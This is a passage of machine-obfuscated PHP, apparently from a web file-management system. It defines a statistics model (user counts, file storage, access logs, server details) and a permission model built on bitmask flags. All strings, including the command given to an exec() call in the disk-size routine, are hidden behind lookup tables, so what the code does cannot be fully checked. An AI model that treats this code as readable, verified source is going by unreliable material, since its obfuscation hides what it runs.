array($¢ÈÄş¢[476] => intval($¥´°ùˆ), $¢ÈÄş¢[97] => $¢ÈÄş¢[12], $¢ÈÄş¢[1392] => array()); } $Å‡á°»Ô = explode($¢ÈÄş¢[8], trim($¥´°ùˆ, $¢ÈÄş¢[8])); if (count($Å‡á°»Ô) < 2) { show_tips(clear_html($¥´°ùˆ) . $¢ÈÄş¢[1397]); } return array($¢ÈÄş¢[476] => intval($Å‡á°»Ô[0]), $¢ÈÄş¢[97] => $Å‡á°»Ô[1], $¢ÈÄş¢[1392] => array_slice($Å‡á°»Ô, 1)); } } goto D˜’šÌ¿ô³; EÓŒİË®Û‡: class AnalysisModel extends ModelBaseLight { public function init($†şöİù) { $›ØÆÈ”ı =& $_SERVER[Ñ¯©ç]; $òğÓ—í = array($›ØÆÈ”ı[645] => array($›ØÆÈ”ı[33] => $›ØÆÈ”ı[1884], $›ØÆÈ”ı[334] => array($›ØÆÈ”ı[256], $›ØÆÈ”ı[818], $›ØÆÈ”ı[1885], $›ØÆÈ”ı[1886])), $›ØÆÈ”ı[1887] => array($›ØÆÈ”ı[33] => $›ØÆÈ”ı[1888], $›ØÆÈ”ı[334] => array($›ØÆÈ”ı[256], $›ØÆÈ”ı[816], $›ØÆÈ”ı[1889], $›ØÆÈ”ı[1890], $›ØÆÈ”ı[1891]))); if (!isset($òğÓ—í[$†şöİù])) { return !1; } $this->optionType = $òğÓ—í[$†şöİù][$›ØÆÈ”ı[33]]; $this->field = $òğÓ—í[$†şöİù][$›ØÆÈ”ı[334]]; return !0; } public function listData($±¸ËçË’ = false, $ûÊ…Êå­ = "\155\157\144\x69\x66\x79\124\x69\155\145", $°É½úú° = false) { return parent::listData($±¸ËçË’, $ûÊ…Êå­, $°É½úú°); } public function trendList($­¢àßÅÚ) { $‡Ìäô—Ö =& $_SERVER[Ñ¯©ç]; $§ß½Á“ = $this->listData(); if ($§ß½Á“) { $¦›ââ¯Ù = end($§ß½Á“); $¥Îà—‘ = date($‡Ìäô—Ö[1892], strtotime($‡Ìäô—Ö[1893])); if ($¦›ââ¯Ù[$‡Ìäô—Ö[256]] == $¥Îà—‘) { return $§ß½Á“; } $ÖËœ‰ÎÑ = strtotime($¦›ââ¯Ù[$‡Ìäô—Ö[256]]); } if (!isset($ÖËœ‰ÎÑ)) { $ËÄ¥äÏ€ = $­¢àßÅÚ == $‡Ìäô—Ö[645] ? $‡Ìäô—Ö[582] : $‡Ìäô—Ö[877]; $ÖËœ‰ÎÑ = Model($ËÄ¥äÏ€)->min($‡Ìäô—Ö[232]); } $ÙÌ°ô¤Û = $‡Ìäô—Ö[1894] . ucfirst($­¢àßÅÚ); $¸Ó¸ï©‘ = $this->dateList($ÖËœ‰ÎÑ); foreach ($¸Ó¸ï©‘ as $¥Îà—‘) { $this->{$ÙÌ°ô¤Û}($¥Îà—‘); } return $this->listData(); } private function dateList($…ì²¸Ö) { $ğó½óßÆ =& $_SERVER[Ñ¯©ç]; $×Í÷ñƒğ = $…ì²¸Ö; $è¢ŠÊ = strtotime($ğó½óßÆ[1893]); $œÌªÌ»“ = array(); while ($×Í÷ñƒğ <= $è¢ŠÊ) { $œÌªÌ»“[] = date($ğó½óßÆ[1892], $×Í÷ñƒğ); $×Í÷ñƒğ = strtotime($ğó½óßÆ[1895], $×Í÷ñƒğ); } return $œÌªÌ»“; } public function _recordUser($ñ²…î¹Ö = '') { $ó«ğ„Œá =& $_SERVER[Ñ¯©ç]; $˜Û—²¼ê = strtotime(date($ó«ğ„Œá[1896], strtotime($ñ²…î¹Ö))); $†Ì‚ÈÃğ = strtotime(date($ó«ğ„Œá[1897], strtotime($ñ²…î¹Ö))); $«¹ÙºÃÙ = array($ó«ğ„Œá[232] => array($ó«ğ„Œá[1066], $†Ì‚ÈÃğ)); $®½ò€§å = Model($ó«ğ„Œá[582])->where($«¹ÙºÃÙ)->count($ó«ğ„Œá[1757]); $«¹ÙºÃÙ[$ó«ğ„Œá[232]] = array($ó«ğ„Œá[393], array($˜Û—²¼ê, $†Ì‚ÈÃğ)); $µ¶»„À  = Model($ó«ğ„Œá[582])->where($«¹ÙºÃÙ)->count($ó«ğ„Œá[1757]); $«¹ÙºÃÙ[$ó«ğ„Œá[33]] = $ó«ğ„Œá[1898]; $€ÜÇù = Model($ó«ğ„Œá[1899])->where($«¹ÙºÃÙ)->count($ó«ğ„Œá[1900]); $®”˜Ö = array($ó«ğ„Œá[256] => $ñ²…î¹Ö, $ó«ğ„Œá[818] => (int) $®½ò€§å, $ó«ğ„Œá[1885] => (int) $µ¶»„À , $ó«ğ„Œá[1886] => (int) $€ÜÇù); return $this->insert($®”˜Ö); } public function _recordStore($¡£èì÷© = '') { $Ûßè—šÓ =& $_SERVER[Ñ¯©ç]; $ºÛ£¦û¿ = strtotime(date($Ûßè—šÓ[1897], strtotime($¡£èì÷©))); $ÆßÃáúí = array($Ûßè—šÓ[232] => array($Ûßè—šÓ[1066], $ºÛ£¦û¿)); $¦Ü·¡¹è = Model($Ûßè—šÓ[527])->where($ÆßÃáúí)->sum($Ûßè—šÓ[89]); $ÆßÃáúí[$Ûßè—šÓ[468]] = 0; $÷°˜”Ú¶ = Model($Ûßè—šÓ[877])->where($ÆßÃáúí)->sum($Ûßè—šÓ[89]); $ÆßÃáúí[$Ûßè—šÓ[191]] = 1; $ˆıË”ä¼ = Model($Ûßè—šÓ[877])->where($ÆßÃáúí)->sum($Ûßè—šÓ[89]); $ÆßÃáúí[$Ûßè—šÓ[191]] = 2; $Ã›úî = Model($Ûßè—šÓ[877])->where($ÆßÃáúí)->sum($Ûßè—šÓ[89]); $¶×éŞ¤½ = array($Ûßè—šÓ[256] => $¡£èì÷©, $Ûßè—šÓ[816] => (int) $÷°˜”Ú¶, $Ûßè—šÓ[1889] => (int) $¦Ü·¡¹è, $Ûßè—šÓ[1890] => (int) $ˆıË”ä¼, $Ûßè—šÓ[1891] => (int) $Ã›úî); return $this->insert($¶×éŞ¤½); } public function trend($«‚œÔ¨ª, $¸½ùëş¿) { $Æâ÷Ï‡· =& $_SERVER[Ñ¯©ç]; if (!$this->init($«‚œÔ¨ª)) { return !1; } $¢ïŸë§“ = $this->trendList($«‚œÔ¨ª); if ($¢ïŸë§“ && $¸½ùëş¿ != $Æâ÷Ï‡·[1730]) { $áãù˜¿ = $¢ïŸë§“[0][$Æâ÷Ï‡·[256]]; $ôŠù¸çÆ = $this->validDate($¸½ùëş¿, $áãù˜¿); $ÀÖÒÛúÄ = array(); $Æ÷š€õã = array_to_keyvalue($¢ïŸë§“, $Æâ÷Ï‡·[256]); foreach ($ôŠù¸çÆ as $¹ßç™Ä…) { if (isset($Æ÷š€õã[$¹ßç™Ä…])) { $ñÈÌÓÂ¿ = $Æ÷š€õã[$¹ßç™Ä…]; } else { $ñÈÌÓÂ¿ = end($¢ïŸë§“); $ñÈÌÓÂ¿[$Æâ÷Ï‡·[256]] = $¹ßç™Ä…; if ($«‚œÔ¨ª == $Æâ÷Ï‡·[645]) { $ñÈÌÓÂ¿[$Æâ÷Ï‡·[1885]] = $ñÈÌÓÂ¿[$Æâ÷Ï‡·[1886]] = 0; } } $ÀÖÒÛúÄ[] = $ñÈÌÓÂ¿; } $¢ïŸë§“ = $ÀÖÒÛúÄ; } $¤¸Õš = array($Æâ÷Ï‡·[645] => array($Æâ÷Ï‡·[818] => LNG($Æâ÷Ï‡·[1901]), $Æâ÷Ï‡·[1885] => LNG($Æâ÷Ï‡·[1902]), $Æâ÷Ï‡·[1886] => LNG($Æâ÷Ï‡·[1903])), $Æâ÷Ï‡·[1887] => array($Æâ÷Ï‡·[816] => LNG($Æâ÷Ï‡·[1904]), $Æâ÷Ï‡·[1889] => LNG($Æâ÷Ï‡·[1905]), $Æâ÷Ï‡·[1890] => LNG($Æâ÷Ï‡·[1906]), $Æâ÷Ï‡·[1891] => LNG($Æâ÷Ï‡·[1907]))); $Ì‰ó¢Ò” = array($Æâ÷Ï‡·[645] => $Æâ÷Ï‡·[1908], $Æâ÷Ï‡·[1887] => $Æâ÷Ï‡·[89]); if (empty($¢ïŸë§“)) { $¹ßç™Ä… = date($Æâ÷Ï‡·[1892], strtotime($Æâ÷Ï‡·[1893])); $á¡âÀæã = array($Æâ÷Ï‡·[256] => $¹ßç™Ä…); foreach ($¤¸Õš[$«‚œÔ¨ª] as $µµâ¶øÏ => $§ñÑ•‘‰) { $á¡âÀæã[$µµâ¶øÏ] = 0; } $¢ïŸë§“[] = $á¡âÀæã; } $è¸Ëòâ = array(); foreach ($¢ïŸë§“ as $§ñÑ•‘‰) { if ($«‚œÔ¨ª == $Æâ÷Ï‡·[1887] && $§ñÑ•‘‰[$Æâ÷Ï‡·[1889]] > $§ñÑ•‘‰[$Æâ÷Ï‡·[816]]) { $§ñÑ•‘‰[$Æâ÷Ï‡·[1889]] = $§ñÑ•‘‰[$Æâ÷Ï‡·[816]]; } foreach ($¤¸Õš[$«‚œÔ¨ª] as $µµâ¶øÏ => $ƒõÜºŠÃ) { $ñÈÌÓÂ¿ = array($Æâ÷Ï‡·[256] => $§ñÑ•‘‰[$Æâ÷Ï‡·[256]], $Æâ÷Ï‡·[1647] => $ƒõÜºŠÃ); $ñÈÌÓÂ¿[$Ì‰ó¢Ò”[$«‚œÔ¨ª]] = isset($§ñÑ•‘‰[$µµâ¶øÏ]) ? $§ñÑ•‘‰[$µµâ¶øÏ] : 0; $è¸Ëòâ[] = $ñÈÌÓÂ¿; } } return $è¸Ëòâ; } public function validDate($î¸¡¹Ÿ›, $Ô¸ö¦Ò¡) { $™ÛÖûÑ‚ =& $_SERVER[Ñ¯©ç]; $õí¤“©ã = date($™ÛÖûÑ‚[1892], strtotime($™ÛÖûÑ‚[1893])); $¬çëÏÇ¥ = array($õí¤“©ã); switch ($î¸¡¹Ÿ›) { case $™ÛÖûÑ‚[1737]: $ıáøÔï¶ = mktime(0, 0, 0, date($™ÛÖûÑ‚[1909]), date($™ÛÖûÑ‚[1423]) - date($™ÛÖûÑ‚[1517]) + 7 - 7, date($™ÛÖûÑ‚[1910])); $Úõ¯Óç = 0; do { $èğ˜ç®Ù = date($™ÛÖûÑ‚[1892], $ıáøÔï¶ - 3600 * 24 * 7 * $Úõ¯Óç); $¬çëÏÇ¥[] = $èğ˜ç®Ù; $Úõ¯Óç++; } while ($Ô¸ö¦Ò¡ < $èğ˜ç®Ù); break; case $™ÛÖûÑ‚[1735]: $Úõ¯Óç = 1; do { $¬Çƒ¤ß² = date($™ÛÖûÑ‚[1911], strtotime("\55\40{$Úõ¯Óç}\40\x6d\157\x6e\x74\x68\x73")); $¬çëÏÇ¥[] = $¬Çƒ¤ß²; $Úõ¯Óç++; } while ($Ô¸ö¦Ò¡ < $¬Çƒ¤ß²); break; case $™ÛÖûÑ‚[1912]: $ĞŒ½‡Üñ = (int) date($™ÛÖûÑ‚[1910], strtotime($Ô¸ö¦Ò¡)); $“øÈığÃ = (int) date($™ÛÖûÑ‚[1910]); if ($ĞŒ½‡Üñ >= $“øÈığÃ) { break; } for ($ĞŒ½‡Üñ; $ĞŒ½‡Üñ < $“øÈığÃ; $ĞŒ½‡Üñ++) { $¬çëÏÇ¥[] = $ĞŒ½‡Üñ . $™ÛÖûÑ‚[1913]; } break; default: break; } if ($Ô¸ö¦Ò¡ > end($¬çëÏÇ¥)) { array_pop($¬çëÏÇ¥); } sort($¬çëÏÇ¥); return $¬çëÏÇ¥; } public function listTable($ù£¿Íù) { $‹”Ä¶şı = ucfirst($ù£¿Íù); return Model($‹”Ä¶şı)->listData(); } public function option($œÂô«´) { $µ‘°êò = $_SERVER[Ñ¯©ç][1914] . ucfirst($œÂô«´); return $this->{$µ‘°êò}(); } private function optionUser() { $“¼æ”Æè =& $_SERVER[Ñ¯©ç]; $ïÇï—¤ = Model($“¼æ”Æè[582])->count($“¼æ”Æè[1757]); $â“Ì´Š· = Model($“¼æ”Æè[582])->where($“¼æ”Æè[1915])->count($“¼æ”Æè[1757]); $ı‰ºœê¼ = intval($GLOBALS[$“¼æ”Æè[6]][$“¼æ”Æè[409]][$“¼æ”Æè[1703]]) / 3600; $×ËĞİËü = strtotime("\55{$ı‰ºœê¼}\x20\x68\x6f\165\162\x73"); $¾£ô¨…ö = strtotime(date($“¼æ”Æè[1896])); if ($×ËĞİËü < $¾£ô¨…ö) { $×ËĞİËü = $¾£ô¨…ö; } $Û£Â•ø = array($“¼æ”Æè[1916] => array($“¼æ”Æè[1067], $×ËĞİËü)); $•“„‡÷ = (int) Model($“¼æ”Æè[582])->where($Û£Â•ø)->count($“¼æ”Æè[1757]); if (!$•“„‡÷) { $•“„‡÷ = 1; } $Û£Â•ø = array($“¼æ”Æè[1916] => array($“¼æ”Æè[1067], $¾£ô¨…ö)); $–ÇÍèÉ = Model($“¼æ”Æè[582])->where($Û£Â•ø)->count($“¼æ”Æè[1757]); return array($“¼æ”Æè[811] => (int) $ïÇï—¤, $“¼æ”Æè[1917] => (int) ($ïÇï—¤ - $â“Ì´Š·), $“¼æ”Æè[1918] => (int) $â“Ì´Š·, $“¼æ”Æè[1919] => (int) $–ÇÍèÉ, $“¼æ”Æè[1920] => $•“„‡÷); } private function optionFile() { $£¹¹ÔÕ¥ =& $_SERVER[Ñ¯©ç]; $à¿şº¥ = $this->sourceSize(); $õ¸µª‚Ï = $à¿şº¥[$£¹¹ÔÕ¥[89]]; $Ú‹Ìƒù¶ = $à¿şº¥[$£¹¹ÔÕ¥[1889]]; $™ôŠíÛ = Model($£¹¹ÔÕ¥[877])->where(array($£¹¹ÔÕ¥[468] => 0))->count($£¹¹ÔÕ¥[194]); $Äåñ‘Î„ = array($£¹¹ÔÕ¥[468] => 0, $£¹¹ÔÕ¥[232] => array($£¹¹ÔÕ¥[1067], strtotime(date($£¹¹ÔÕ¥[1896])))); $ªõ‘¬ó = Model($£¹¹ÔÕ¥[877])->where($Äåñ‘Î„)->sum($£¹¹ÔÕ¥[89]); $ÖÌÚ–ß¥ = Model($£¹¹ÔÕ¥[877])->where($Äåñ‘Î„)->count($£¹¹ÔÕ¥[194]); return array($£¹¹ÔÕ¥[816] => $õ¸µª‚Ï, $£¹¹ÔÕ¥[1889] => $Ú‹Ìƒù¶, $£¹¹ÔÕ¥[1921] => $õ¸µª‚Ï - $Ú‹Ìƒù¶, $£¹¹ÔÕ¥[1922] => (int) $ªõ‘¬ó, $£¹¹ÔÕ¥[818] => (int) $™ôŠíÛ, $£¹¹ÔÕ¥[1923] => (int) $ÖÌÚ–ß¥); } private function optionAccess() { $ƒø¸Á« =& $_SERVER[Ñ¯©ç]; return array($ƒø¸Á«[811] => $this->typeLogCnt(), $ƒø¸Á«[120] => $this->typeLogCnt($ƒø¸Á«[120]), $ƒø¸Á«[508] => $this->typeLogCnt($ƒø¸Á«[508]), $ƒø¸Á«[1924] => $this->typeLogCnt($ƒø¸Á«[1924]), $ƒø¸Á«[1925] => $this->typeLogCnt($ƒø¸Á«[1925]), $ƒø¸Á«[645] => $this->typeLogCnt($ƒø¸Á«[12], $ƒø¸Á«[1900])); } private function typeLogCnt($çÒ¦ô›ú = '', $¡ÊÏŸ› = "\151\144") { $†‰ÒğÑ¹ =& $_SERVER[Ñ¯©ç]; $œ÷¢‹ã = array($†‰ÒğÑ¹[120] => array($†‰ÒğÑ¹[1926], $†‰ÒğÑ¹[1927]), $†‰ÒğÑ¹[508] => array($†‰ÒğÑ¹[1928], $†‰ÒğÑ¹[1929]), $†‰ÒğÑ¹[1924] => array($†‰ÒğÑ¹[1930], $†‰ÒğÑ¹[1931], $†‰ÒğÑ¹[1932]), $†‰ÒğÑ¹[1925] => array($†‰ÒğÑ¹[1933], $†‰ÒğÑ¹[1934]), $†‰ÒğÑ¹[1935] => array($†‰ÒğÑ¹[1936], $†‰ÒğÑ¹[1937], $†‰ÒğÑ¹[1938])); $ã¥üÍ¡³ = strtotime(date($†‰ÒğÑ¹[1896])); $†•…”êò = array($†‰ÒğÑ¹[232] => array($†‰ÒğÑ¹[1067], $ã¥üÍ¡³)); if ($çÒ¦ô›ú) { $†•…”êò[$†‰ÒğÑ¹[33]] = array($†‰ÒğÑ¹[7], $œ÷¢‹ã[$çÒ¦ô›ú]); } $æı˜êØÈ = Model($†‰ÒğÑ¹[1899])->where($†•…”êò)->count($¡ÊÏŸ›); return (int) $æı˜êØÈ; } private function optionServer() { $û£´Ûç =& $_SERVER[Ñ¯©ç]; $ÚàùÓ¬­ = $this->diskDriver(); $š‹ÂÃË² = KodIO::defaultDriver(); $‚¡ÙÔ = array($û£´Ûç[869] => $š‹ÂÃË²[$û£´Ûç[458]]); $à®êàá = Model($û£´Ûç[527])->where($‚¡ÙÔ)->sum($û£´Ûç[89]); $öÔÑºĞ = explode($û£´Ûç[53], $_SERVER[$û£´Ûç[157]]); $îÀÖ›Ã¥ = $öÔÑºĞ[0]; $ËÃÁÕÃã = $GLOBALS[$û£´Ûç[6]][$û£´Ûç[21]]; $èŠ¾Ô•à = $ËÃÁÕÃã[$û£´Ûç[1029]]; if ($èŠ¾Ô•à == $û£´Ûç[1017]) { $Ò©Ÿç¯º = explode($û£´Ûç[1339], $ËÃÁÕÃã[$û£´Ûç[1028]]); $èŠ¾Ô•à = $Ò©Ÿç¯º[0]; } if ($èŠ¾Ô•à == $û£´Ûç[965] || $èŠ¾Ô•à == $û£´Ûç[856]) { $ØŸ™¹ñ¨ = Model()->db()->query($û£´Ûç[1939]); $ø«¨´°Ã = $ØŸ™¹ñ¨[0] && isset($ØŸ™¹ñ¨[0][$û£´Ûç[1646]]) ? $ØŸ™¹ñ¨[0][$û£´Ûç[1646]] : 0; $èŠ¾Ô•à = $û£´Ûç[1940] . ($ø«¨´°Ã ? $û£´Ûç[8] . $ø«¨´°Ã : $û£´Ûç[12]); } $æåş™¹‚ = $GLOBALS[$û£´Ûç[6]][$û£´Ûç[409]][$û£´Ûç[879]]; return array($û£´Ûç[1941] => $ÚàùÓ¬­ ? $ÚàùÓ¬­[$û£´Ûç[1942]] : 0, $û£´Ûç[1943] => $ÚàùÓ¬­ ? $ÚàùÓ¬­[$û£´Ûç[1944]] : 0, $û£´Ûç[1945] => (int) $š‹ÂÃË²[$û£´Ûç[1942]] * 1024 * 1024 * 1024, $û£´Ûç[1946] => (int) $à®êàá, $û£´Ûç[1947] => ucfirst($îÀÖ›Ã¥), $û£´Ûç[1948] => $û£´Ûç[1949] . PHP_VERSION, $û£´Ûç[1950] => phpBuild64() ? 64 : 32, $û£´Ûç[810] => str_replace($û£´Ûç[1186], $û£´Ûç[1045], $èŠ¾Ô•à), $û£´Ûç[409] => ucfirst($æåş™¹‚), $û£´Ûç[32] => $_SERVER[$û£´Ûç[1951]]); } private function diskDriver() { $âØõ·ğú =& $_SERVER[Ñ¯©ç]; $­ÚıªŸ÷ = $âØõ·ğú[8]; $¯ä§£€ó = $GLOBALS[$âØõ·ğú[6]][$âØõ·ğú[1356]] == $âØõ·ğú[1357]; if ($¯ä§£€ó) { $­ÚıªŸ÷ = $âØõ·ğú[1952]; if (function_exists($âØõ·ğú[1953])) { exec($âØõ·ğú[1954], $©„œî¤ƒ); $­ÚıªŸ÷ = $©„œî¤ƒ[1] . $âØõ·ğú[8]; } } if (!file_exists($­ÚıªŸ÷)) { return; } $ç«”Šé = @disk_total_space($­ÚıªŸ÷); $©¹ø”ãö = $ç«”Šé - @disk_free_space($­ÚıªŸ÷); return array($âØõ·ğú[1942] => $ç«”Šé, $âØõ·ğú[1944] => $©¹ø”ãö); } public function fileChart($ÚØ¼Úé—) { $şË£¥Ï® =& $_SERVER[Ñ¯©ç]; if (isset($ÚØ¼Úé—[$şË£¥Ï®[1757]])) { return Model($şË£¥Ï®[877])->userFileTypeProfile($ÚØ¼Úé—[$şË£¥Ï®[1757]]); } if (isset($ÚØ¼Úé—[$şË£¥Ï®[1955]])) { return Model($şË£¥Ï®[877])->groupFileTypeProfile($ÚØ¼Úé—[$şË£¥Ï®[1955]]); } $ÎöÓßÜ = $this->sourceSize(); $êÊ¾ì£ = array($şË£¥Ï®[193] => 0, $şË£¥Ï®[191] => 1); $·ƒ Œ¶ = Model($şË£¥Ï®[877])->where($êÊ¾ì£)->sum($şË£¥Ï®[89]); $êÊ¾ì£[$şË£¥Ï®[191]] = 2; $Ã¤Œë¼ = Model($şË£¥Ï®[877])->where($êÊ¾ì£)->sum($şË£¥Ï®[89]); return array($şË£¥Ï®[816] => $ÎöÓßÜ[$şË£¥Ï®[89]], $şË£¥Ï®[1889] => $ÎöÓßÜ[$şË£¥Ï®[1889]], $şË£¥Ï®[1890] => (int) $·ƒ Œ¶, $şË£¥Ï®[1891] => (int) $Ã¤Œë¼); } private function sourceSize() { $Œıˆàä½ =& $_SERVER[Ñ¯©ç]; $·¸âãÓ… = Model($Œıˆàä½[877])->where(array($Œıˆàä½[468] => 0))->sum($Œıˆàä½[89]); $Ö¹¶ì¦¹ = Model($Œıˆàä½[527])->sum($Œıˆàä½[89]); if ($Ö¹¶ì¦¹ > $·¸âãÓ…) { $Ö¹¶ì¦¹ = $·¸âãÓ…; } return array($Œıˆàä½[89] => (int) $·¸âãÓ…, $Œıˆàä½[1889] => (int) $Ö¹¶ì¦¹); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $šÍêÊñ¸ =& $_SERVER[Ñ¯©ç]; $Œ¯àıé® = array(array($šÍêÊñ¸[477] => LNG($šÍêÊñ¸[1956]), $šÍêÊñ¸[1957] => $šÍêÊñ¸[1958], $šÍêÊñ¸[1959] => 1, $šÍêÊñ¸[1960] => 1, $šÍêÊñ¸[1961] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($šÍêÊñ¸[477] => LNG($šÍêÊñ¸[1962]), $šÍêÊñ¸[1957] => $šÍêÊñ¸[1963], $šÍêÊñ¸[1959] => 2, $šÍêÊñ¸[1960] => 1, $šÍêÊñ¸[1961] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($šÍêÊñ¸[477] => LNG($šÍêÊñ¸[1964]), $šÍêÊñ¸[1957] => $šÍêÊñ¸[1965], $šÍêÊñ¸[1959] => 3, $šÍêÊñ¸[1960] => 1, $šÍêÊñ¸[1961] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($šÍêÊñ¸[477] => LNG($šÍêÊñ¸[1966]), $šÍêÊñ¸[1957] => $šÍêÊñ¸[1967], $šÍêÊñ¸[1959] => 4, $šÍêÊñ¸[1960] => 1, $šÍêÊñ¸[1961] => self::AUTH_SHOW | self::AUTH_VIEW), array($šÍêÊñ¸[477] => LNG($šÍêÊñ¸[1968]), $šÍêÊñ¸[1957] => $šÍêÊñ¸[1969], $šÍêÊñ¸[1959] => 5, $šÍêÊñ¸[1960] => 1, $šÍêÊñ¸[1961] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($šÍêÊñ¸[477] => LNG($šÍêÊñ¸[1970]), $šÍêÊñ¸[1957] => $šÍêÊñ¸[1971], $šÍêÊñ¸[1959] => 6, $šÍêÊñ¸[1960] => 1, $šÍêÊñ¸[1961] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($šÍêÊñ¸[477] => LNG($šÍêÊñ¸[1972]), $šÍêÊñ¸[1957] => $šÍêÊñ¸[1973], $šÍêÊñ¸[1959] => 7, $šÍêÊñ¸[1960] => 1, $šÍêÊñ¸[1961] => 0)); return $Œ¯àıé®; } public static function authCheck($´ÖÉÚ¿, $„±¬ŠÑ÷) { $îŒØ˜Á› =& $_SERVER[Ñ¯©ç]; $´ÖÉÚ¿ = intval($´ÖÉÚ¿); if (KodUser::isRoot() && $GLOBALS[$îŒØ˜Á›[6]][$îŒØ˜Á›[1974]]) { return !0; } if ($´ÖÉÚ¿ <= 0) { return !1; } if (($´ÖÉÚ¿ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($´ÖÉÚ¿ & $„±¬ŠÑ÷); } public static function authCheckShow($ò³¤ŒÇ®) { return self::authCheck($ò³¤ŒÇ®, self::AUTH_SHOW); } public static function authCheckView($Øğ¬ïÇ´) { return self::authCheck($Øğ¬ïÇ´, self::AUTH_VIEW); } public static function authCheckDownload($°ÆõüŸ“) { return self::authCheck($°ÆõüŸ“, self::AUTH_DOWNLOAD); } public static function authCheckUpload($¶ÒôôÍÎ) { return self::authCheck($¶ÒôôÍÎ, self::AUTH_UPLOAD); } public static function authCheckEdit($Š†‡Î§¼) { return self::authCheck($Š†‡Î§¼, self::AUTH_EDIT); } public static function authCheckRemove($€±—ñè) { return self::authCheck($€±—ñè, self::AUTH_REMOVE); } public static function authCheckShare($ ÍŞŸ¯á) { return self::authCheck($ ÍŞŸ¯á, self::AUTH_SHARE); } public static function authCheckComment($¨¥¡¨Ê) { return self::authCheck($¨¥¡¨Ê, self::AUTH_COMMENT); } public static function authCheckEvent($ş‡•ı€) { return self::authCheck($ş‡•ı€, self::AUTH_EVENT); } public static function authCheckRoot($åŠ€ãö) { return self::authCheck($åŠ€ãö, self::AUTH_ROOT); } public static function authCheckAction($Îûêéä, $ƒ·ÁÖ¹Ë) { $œº­èàâ =& $_SERVER[Ñ¯©ç]; $å®öÛÇ = array($œº­èàâ[1975] => self::AUTH_VIEW, $œº­èàâ[1251] => self::AUTH_DOWNLOAD, $œº­èàâ[120] => self::AUTH_UPLOAD, $œº­èàâ[1925] => self::AUTH_EDIT, $œº­èàâ[1924] => self::AUTH_REMOVE, $œº­èàâ[1935] => self::AUTH_SHARE, $œº­èàâ[414] => self::AUTH_COMMENT, $œº­èàâ[1745] => self::AUTH_EVENT, $œº­èàâ[1976] => self::AUTH_ROOT); if (!isset($å®öÛÇ[$ƒ·ÁÖ¹Ë])) { return; } $íé–äÜî = $å®öÛÇ[$ƒ·ÁÖ¹Ë]; $Îûêéä = intval($Îûêéä); if ($Îûêéä <= 0) { return !1; } if (($Îûêéä & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Îûêéä & $íé–äÜî); } public static function authDisable($¡¡çÈ·¿, $¦£ã³£) { if (intval($¡¡çÈ·¿) <= 0) { return 0; } return intval($¡¡çÈ·¿) & ~$¦£ã³£; } public $optionType = "\123\171\x73\x74\145\x6d\56\163\157\165\x72\x63\x65\x41\165\x74\x68\114\151\163\164"; public $field = array("\156\x61\155\x65", "\141\165\x74\150", "\x6c\141\142\145\x6c", "\144\151\x73\x70\154\141\x79", "\163\171\x73\x74\x65\x6d", "\163\x6f\x72\164"); public function initData() { $ä—µº¾ü = $this->authDefault(); foreach ($ä—µº¾ü as $âÇ™§×Ô) { $this->add($âÇ™§×Ô); } } public function findAuth($ƒåÁ¿·ë, $â¯·‹Ö) { $ë×À‘œÚ =& $_SERVER[Ñ¯©ç]; $•Ëıù½” = parent::listData(); foreach ($•Ëıù½” as $·‹ôä•„) { $×”õ÷¦ï = intval($·‹ôä•„[$ë×À‘œÚ[470]]); if ($×”õ÷¦ï <= 0 || $·‹ôä•„[$ë×À‘œÚ[1977]] == 0) { continue; } if (($×”õ÷¦ï & $ƒåÁ¿·ë) != $ƒåÁ¿·ë) { continue; } if (($×”õ÷¦ï & $â¯·‹Ö) != 0) { continue; } return $·‹ôä•„[$ë×À‘œÚ[458]]; } return !1; } public function findAuthReadOnly() { $öõóò¼ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $µı™üëû = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($öõóò¼, $µı™üëû); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $Í–Íçëú =& $_SERVER[Ñ¯©ç]; $©å­ùÈ = parent::listData(); $¢½îŸë  = !1; foreach ($©å­ùÈ as $Û²çŠïÖ) { if ($Û²çŠïÖ[$Í–Íçëú[470]] <= 0 || $Û²çŠïÖ[$Í–Íçëú[1977]] == $Í–Íçëú[229]) { continue; } if (!$¢½îŸë ) { $¢½îŸë  = $Û²çŠïÖ; continue; } if ($¢½îŸë [$Í–Íçëú[470]] > $Û²çŠïÖ[$Í–Íçëú[470]]) { $¢½îŸë  = $Û²çŠïÖ; } } return $¢½îŸë  ? $¢½îŸë [$Í–Íçëú[458]] : $Í–Íçëú[12]; } public function listData($âÁâª = false, $•Õ€À¶ì = "\163\x6f\x72\164", $¿œÛçÙá = false) { return parent::listData($âÁâª, $•Õ€À¶ì, $¿œÛçÙá); } public function update($øÎÊĞä¦, $·ùæèŠ™) { $İŒÏ‡í‹ =& $_SERVER[Ñ¯©ç]; $ãèÓÈ´ = parent::listData($øÎÊĞä¦); $ˆ‡€šÀ¹ = 